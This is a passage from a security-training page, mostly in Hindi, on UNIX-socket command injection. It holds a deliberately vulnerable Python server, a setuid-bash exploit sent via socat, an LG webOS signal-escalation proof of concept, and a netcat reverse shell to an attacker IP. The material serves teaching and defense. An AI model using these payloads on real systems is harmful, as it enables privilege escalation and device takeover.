# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

निम्न उदाहरण में एक **unix socket is created** (`/tmp/socket_test.s`) और जो कुछ भी **received** होगा वह `os.system` द्वारा **executed** हो जाएगा। मुझे पता है कि आप इसे वास्तविक दुनिया में शायद नहीं पाएँगे, पर इस उदाहरण का उद्देश्य यह दिखाना है कि unix sockets का उपयोग करने वाला कोड कैसा दिखता है, और सबसे खराब संभव मामले में इनपुट को कैसे संभाला जाए।
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**कोड चलाएँ** python का उपयोग करके: `python s.py` और **जाँचें कि socket कैसे सुन रहा है**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## केस स्टडी: Root-owned UNIX socket signal-triggered escalation (LG webOS)

कुछ privileged daemons एक root-owned UNIX socket expose करते हैं जो untrusted input स्वीकार करते हैं और privileged actions को thread-IDs और signals के साथ जोड़ते हैं। अगर प्रोटोकॉल unprivileged client को यह प्रभावित करने की अनुमति देता है कि कौन सा native thread टार्गेट किया जाए, तो आप privileged code path ट्रिगर करके escalate कर सकते हैं।

Observed pattern:
- एक root-owned socket से कनेक्ट करें (e.g., /tmp/remotelogger).
- एक thread बनाएं और उसका native thread id (TID) प्राप्त करें.
- TID (packed) और padding को एक request के रूप में भेजें; acknowledgement प्राप्त करें.
- उस TID को एक specific signal दें ताकि privileged behaviour ट्रिगर हो.

Minimal PoC स्केच:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
इसे root shell में बदलने के लिए, एक सरल named-pipe + nc पैटर्न का उपयोग किया जा सकता है:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
नोट्स:
- यह बग श्रेणी unprivileged client state (TIDs) से निकले मानों पर भरोसा करने और उन्हें privileged signal handlers या logic से बाँधने से उत्पन्न होती है।
- सुरक्षा बढ़ाने के लिए socket पर credentials लागू करें, message formats को validate करें, और privileged operations को externally supplied thread identifiers से decouple करें।

## संदर्भ

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
